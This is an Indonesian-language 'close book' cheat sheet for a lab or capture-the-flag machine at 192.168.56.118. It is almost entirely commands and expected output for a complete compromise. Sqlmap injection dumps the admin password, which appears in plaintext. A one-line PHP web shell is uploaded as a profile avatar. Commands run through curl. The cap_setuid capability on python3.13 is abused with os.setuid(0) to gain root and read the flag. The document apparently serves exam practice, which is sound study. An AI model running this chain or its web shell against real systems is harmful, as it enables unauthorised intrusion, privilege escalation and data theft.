# Portrait Close Book — SQLi to Python Capability Root

> Untuk ujian/lab berizin.  
> Fokus: SQLi → admin → upload PHP → Python capability → root → cari flag.  
> Tidak memakai cleanup pada alur utama.

---

## Data Hafalan

```text
TARGET      = 192.168.56.118
WEB         = http://192.168.56.118:8080
Admin URL   = /administrator
Upload URL  = /profile
Upload path = /uploads/cakgup.php
Credential  = admin:AdminPortr417126
User awal   = www-data
Capability  = /usr/bin/python3.13 cap_setuid=ep
Cari flag   = find / -type f -iname "*flag*" 2>/dev/null
```

Inti celah:

```text
SQLi login → dapat admin
admin bisa upload PHP
PHP shell berjalan sebagai www-data
python3.13 punya cap_setuid=ep
os.setuid(0) menjadikan proses Python root
setelah root, cari flag dengan find
```

---

## 1. Set target

```bash
TARGET="192.168.56.118"
WEB="http://192.168.56.118:8080"
LOGIN_URL="$WEB/administrator"
POST_DATA='username=admin&password=test'
```

## 2. Dump credential admin

```bash
sqlmap -u "$LOGIN_URL" \
  --data="$POST_DATA" \
  -p username \
  --batch \
  -D portrait \
  -T users \
  --dump
```

Expected:

```text
admin
AdminPortr417126
```

## 3. Buat web shell PHP

```bash
cat > cakgup.php <<'EOF'
<?php system($_GET['cmd']); ?>
EOF
```

Upload `cakgup.php` melalui:

```text
http://192.168.56.118:8080/administrator
login admin:AdminPortr417126
buka /profile
upload avatar cakgup.php
```

## 4. Validasi RCE

```bash
SHELL_URL="$WEB/uploads/cakgup.php"

curl -sG --data-urlencode "cmd=id; whoami; hostname" "$SHELL_URL"
```

Expected:

```text
uid=33(www-data)
www-data
```

## 5. Root via Python capability dan cari flag

```bash
curl -sG \
  --data-urlencode "cmd=/usr/bin/python3.13 -c 'import os; os.setuid(0); os.system(\"whoami; id; find / -type f -iname \\\"*flag*\\\" 2>/dev/null\")'" \
  "$SHELL_URL"
```

Catat path flag yang muncul.

## 6. Baca flag dari path yang ditemukan

Ganti `/PATH/FLAG` dengan hasil `find`.

```bash
curl -sG \
  --data-urlencode "cmd=/usr/bin/python3.13 -c 'import os; os.setuid(0); os.system(\"cat /PATH/FLAG\")'" \
  "$SHELL_URL"
```

---

# Cheat Sheet Paling Pendek

```bash
WEB="http://192.168.56.118:8080"
LOGIN_URL="$WEB/administrator"
POST_DATA='username=admin&password=test'

sqlmap -u "$LOGIN_URL" --data="$POST_DATA" -p username --batch -D portrait -T users --dump

echo "<?php system(\$_GET['cmd']); ?>" > cakgup.php
# upload cakgup.php via /administrator → /profile

SHELL_URL="$WEB/uploads/cakgup.php"
curl -sG --data-urlencode "cmd=id; whoami" "$SHELL_URL"

curl -sG --data-urlencode "cmd=/usr/bin/python3.13 -c 'import os; os.setuid(0); os.system(\"whoami; find / -type f -iname \\\"*flag*\\\" 2>/dev/null\")'" "$SHELL_URL"

# ganti /PATH/FLAG dengan hasil find
curl -sG --data-urlencode "cmd=/usr/bin/python3.13 -c 'import os; os.setuid(0); os.system(\"cat /PATH/FLAG\")'" "$SHELL_URL"
```

---

## Kalau Python path berbeda

```bash
curl -sG --data-urlencode "cmd=getcap -r / 2>/dev/null | grep -i python" "$SHELL_URL"
```

Pakai path Python yang muncul pada output.
